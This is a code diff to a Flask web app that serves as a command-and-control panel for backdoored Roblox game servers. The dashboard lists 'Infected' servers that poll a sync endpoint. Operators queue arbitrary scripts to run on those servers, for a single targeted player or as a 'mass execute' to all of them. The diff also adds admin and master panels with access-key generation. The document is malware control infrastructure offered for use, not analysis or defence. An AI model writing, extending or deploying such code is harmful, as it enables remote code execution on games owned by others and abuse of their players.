@@ -33,21 +33,13 @@ body { background: var(--bg); color: #fff; font-family: 'Segoe UI', sans-serif; 
 input, textarea { background: rgba(0,0,0,0.8); border: 1px solid var(--border); padding: 12px; color: #fff; width: 100%; border-radius: 10px; outline: none; margin-bottom: 10px; }
 textarea { color: #0f0; font-family: 'Consolas', monospace; height: 200px; resize: none; border-left: 5px solid var(--gold); }
 .hidden { display: none !important; }
-/* Privacy Blur Effect */
 .privacy-active .server-thumb { filter: blur(15px); }
 .privacy-active .game-name { filter: blur(5px); }
-
-@media (max-width: 600px) {
-    .grid { grid-template-columns: 1fr 1fr; gap: 10px; }
-    .nav-item { font-size: 9px; letter-spacing: 1px; }
-}
+@media (max-width: 600px) { .grid { grid-template-columns: 1fr 1fr; gap: 10px; } .nav-item { font-size: 9px; letter-spacing: 1px; } }
 """
 
 DASH_HTML = """
-<!DOCTYPE html><html><head>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <style>""" + BASE_CSS + """</style>
-</head>
+<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1.0"><style>""" + BASE_CSS + """</style></head>
 <body>
     {% if not logged_in %}
     <div style="display:flex; align-items:center; justify-content:center; height:100vh;">
@@ -61,8 +53,8 @@ DASH_HTML = """
         <div class="nav-item active-nav" onclick="tab('live', this)">Infected</div>
         <div class="nav-item" onclick="tab('exec', this)">Executor</div>
         <div class="nav-item" onclick="tab('white', this)">Whitelist</div>
-        {% if is_admin and not is_master %}<div class="nav-item" style="color:#bc13fe;" onclick="tab('admin_panel', this)">Admin Panel</div>{% endif %}
-        {% if is_master %}<div class="nav-item" style="color:#ff4444;" onclick="tab('master', this)">Master Panel</div>{% endif %}
+        {% if is_admin %}<div class="nav-item" style="color:#bc13fe;" onclick="tab('admin_panel', this)">Admin</div>{% endif %}
+        {% if is_master %}<div class="nav-item" style="color:#ff4444;" onclick="tab('master', this)">Master</div>{% endif %}
     </div>
     <div class="viewport">
         <div id="live" class="tab">
@@ -71,6 +63,8 @@ DASH_HTML = """
         </div>
         <div id="exec" class="tab hidden"><div class="card" style="max-width: 700px; margin: auto;"><p style="font-size:11px;">TARGET: <b id="exec_target" style="color:var(--gold);">NONE</b></p><textarea id="code_area" placeholder="-- SCRIPT HERE"></textarea><button class="btn" onclick="execute()">EXECUTE</button></div></div>
         <div id="white" class="tab hidden"><div class="card" style="max-width: 400px; margin: auto; text-align: center;"><input id="w_input" placeholder="Username"><button id="w_btn" class="btn" onclick="addWhite()">WHITELIST</button><div id="profile_box" class="hidden" style="margin-top:20px;"><img id="p_img" src="" style="width:80px; border-radius:50%;"><h3 id="p_name"></h3><button class="btn" style="background:#ff4444; color:#fff;" onclick="resetWhite()">RESET</button></div></div></div>
+        <div id="admin_panel" class="tab hidden"><div class="card" style="max-width: 500px; margin: auto; text-align: center;"><h2 style="color:#bc13fe;">Admin Panel</h2><button class="btn" onclick="genKey('standard', 'key_list_admin')">GEN STANDARD KEY</button><div id="key_list_admin" style="margin-top:10px;"></div></div></div>
+        <div id="master" class="tab hidden"><div class="card" style="max-width: 600px; margin: auto; text-align: center;"><h2 style="color:#ff4444;">Master Controls</h2><textarea id="mass_code" style="height:100px;" placeholder="-- MASS SCRIPT"></textarea><button class="btn" style="background:#ff4444; color:#fff;" onclick="massExec()">SEND TO ALL</button><div style="display:flex; gap:10px; margin-top:10px;"><button class="btn" onclick="genKey('standard', 'key_list_master')">GEN STANDARD</button><button class="btn" style="background:#bc13fe; color:#fff;" onclick="genKey('admin', 'key_list_master')">GEN ADMIN</button></div><div id="key_list_master" style="margin-top:10px;"></div></div></div>
     </div>
     {% endif %}
 <script>
@@ -82,67 +76,102 @@ DASH_HTML = """
             let sHtml = "";
             let grid = document.getElementById('server_grid');
             if (privacyOn) grid.classList.add('privacy-active'); else grid.classList.remove('privacy-active');
-            
             if (Object.keys(data.servers).length === 0) {
-                sHtml = `<div style="text-align:center; padding:40px; color:var(--gold); font-weight:900; font-size:14px; letter-spacing:2px; text-transform:uppercase; grid-column: 1/-1;">No infected yet, please wait...</div>`;
+                sHtml = `<div style="text-align:center; padding:40px; color:var(--gold); font-weight:900; grid-column: 1/-1;">No infected yet...</div>`;
             } else {
-                for(let id in data.servers) { 
-                    let s = data.servers[id]; 
-                    sHtml += `<div class="card"><img src="${s.thumb}" class="server-thumb"><div class="server-info"><b class="game-name">GAME:</b> ${s.name}<br><b>OWNER:</b> ${s.owner}<br><b>PLRS:</b> ${s.p_count}</div><button class="btn" onclick="window.location='roblox-player:1+launchmode:play+gameinstanceid:${id}+placeid:${s.place_id}'">JOIN</button></div>`; 
-                }
+                for(let id in data.servers) { let s = data.servers[id]; sHtml += `<div class="card"><img src="${s.thumb}" class="server-thumb"><div class="server-info"><b>GAME:</b> ${s.name}<br><b>OWNER:</b> ${s.owner}<br><b>PLRS:</b> ${s.p_count}</div><button class="btn" onclick="window.location='roblox-player:1+launchmode:play+gameinstanceid:${id}+placeid:${s.place_id}'">JOIN</button></div>`; }
             }
             grid.innerHTML = sHtml;
         });
+        fetch('/api/personal_data').then(r => r.json()).then(data => {
+            if(data.whitelist) { document.getElementById('exec_target').innerText = data.whitelist.name; document.getElementById('p_img').src = data.whitelist.img; document.getElementById('p_name').innerText = data.whitelist.name; document.getElementById('profile_box').classList.remove('hidden'); document.getElementById('w_input').classList.add('hidden'); document.getElementById('w_btn').classList.add('hidden');
+            } else { document.getElementById('exec_target').innerText = "NONE"; document.getElementById('profile_box').classList.add('hidden'); document.getElementById('w_input').classList.remove('hidden'); document.getElementById('w_btn').classList.remove('hidden'); }
+        });
     }
+    function genKey(type, targetId) { fetch('/api/admin/gen_key', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type: type})}).then(r => r.json()).then(data => { document.getElementById(targetId).innerHTML += `<span class="key-badge">${data.key}</span>`; }); }
+    function massExec() { fetch('/api/admin/mass_execute', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({code: document.getElementById('mass_code').value})}).then(()=>alert("MASS SENT")); }
+    function addWhite() { fetch('/api/whitelist', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({user: document.getElementById('w_input').value})}).then(sync); }
+    function resetWhite() { fetch('/api/reset', {method:'POST'}).then(sync); }
+    function execute() { fetch('/api/execute', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({code: document.getElementById('code_area').value})}); }
     if (document.getElementById('server_grid')) setInterval(sync, 2500);
 </script></body></html>
 """
+
+@app.route('/')
+def index(): return render_template_string(DASH_HTML, logged_in=session.get('logged_in'), is_master=session.get('is_master'), is_admin=session.get('is_admin'))
+
+@app.route('/login', methods=['POST'])
+def login():
+    pw = request.form.get("pw")
+    if pw == MASTER_ADMIN_PW: session.update({'logged_in': True, 'is_master': True, 'is_admin': True, 'sid': 'MASTER_SESSION'})
+    elif pw in valid_keys:
+        k_type = valid_keys[pw]
+        session.update({'logged_in': True, 'is_master': False, 'is_admin': (k_type == 'admin'), 'sid': str(uuid.uuid4())})
+        del valid_keys[pw]
+    return redirect(url_for('index'))
+
+@app.route('/api/admin/gen_key', methods=['POST'])
+def admin_gen():
+    if not session.get('is_admin'): return jsonify({}), 403
+    return jsonify({"key": generate_key(request.json.get("type", "standard"))})
+
+@app.route('/api/admin/mass_execute', methods=['POST'])
+def admin_mass():
+    if session.get('is_master'): mass_execute_queue.append(request.json.get("code"))
+    return jsonify({"ok": True})
+
+@app.route('/api/global_signals')
+def get_global(): return jsonify({"servers": global_servers})
+
+@app.route('/api/personal_data')
+def get_personal(): 
+    sid = session.get('sid')
+    if sid not in user_sessions: user_sessions[sid] = {"whitelist": None, "queue": []}
+    return jsonify(user_sessions[sid])
+
+@app.route('/api/whitelist', methods=['POST'])
+def add_white():
+    sid, user = session.get('sid'), request.json.get("user")
+    r = requests.post("https://users.roblox.com/v1/usernames/users", json={"usernames": [user]}).json()
+    if r.get("data") and sid:
+        uid, name = r["data"][0]["id"], r["data"][0]["requestedUsername"]
+        img = requests.get(f"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={uid}&size=150x150&format=Png").json()["data"][0]["imageUrl"]
+        user_sessions[sid] = {"whitelist": {"name": name, "img": img}, "queue": []}
+    return jsonify({"ok": True})
+
+@app.route('/api/reset', methods=['POST'])
+def reset_white():
+    if session.get('sid') in user_sessions: user_sessions[session.get('sid')]["whitelist"] = None
+    return jsonify({"ok": True})
+
+@app.route('/api/execute', methods=['POST'])
+def run_exec():
+    if session.get('sid') in user_sessions: user_sessions[session.get('sid')]["queue"].append(request.json.get("code"))
+    return jsonify({"ok": True})
 
 @app.route('/roblox/sync', methods=['POST'])
 def roblox_sync():
     global mass_execute_queue
     data = request.json
-    
-    # FIX: Use jobId as the primary key so multiple servers log independently
     jid = data.get("jobId")
-    if not jid: return jsonify({"error": "No JobId"}), 400
-
+    if not jid: return jsonify({"commands": []})
     if jid not in global_servers:
-        try:
-            # Fetching High-Res Thumbnail
-            t = requests.get(f"https://thumbnails.roblox.com/v1/places/gameicons?placeIds={data.get('game_id')}&size=150x150&format=Png").json()
-            thumb_url = t["data"][0]["imageUrl"] if t.get("data") else ""
-        except:
-            thumb_url = ""
-        global_servers[jid] = {"thumb": thumb_url, "place_id": data.get("game_id")}
+        global_servers[jid] = {"thumb": "", "place_id": data.get("game_id")}
+    global_servers[jid].update({"name": data.get("name"), "owner": data.get("owner"), "p_count": len(data.get("players", [])), "last_ping": time.time()})
     
-    # Update existing entry
-    global_servers[jid].update({
-        "name": data.get("name"), 
-        "owner": data.get("owner"), 
-        "p_count": len(data.get("players", [])), 
-        "last_ping": time.time()
-    })
-    
-    # Cleanup dead servers (inactive for 20s)
     dead = [k for k, v in global_servers.items() if time.time() - v.get('last_ping', 0) > 20]
     for k in dead: del global_servers[k]
 
     all_cmds = []
-    # Mass Execute
     for mc in mass_execute_queue: all_cmds.append({"user": "ALL", "code": mc})
     if mass_execute_queue: mass_execute_queue = []
-
-    # Whitelist Target Execute
     players = [p.lower() for p in data.get("players", [])]
     for sid, info in user_sessions.items():
         if info.get("whitelist") and info["whitelist"]["name"].lower() in players:
             for c in info["queue"]: all_cmds.append({"user": info["whitelist"]["name"], "code": c})
             user_sessions[sid]["queue"] = []
-            
     return jsonify({"commands": all_cmds})
 
-# ... (Keep existing Login, Whitelist, and Admin routes from your original script)
-
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000)
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host='0.0.0.0', port=port)
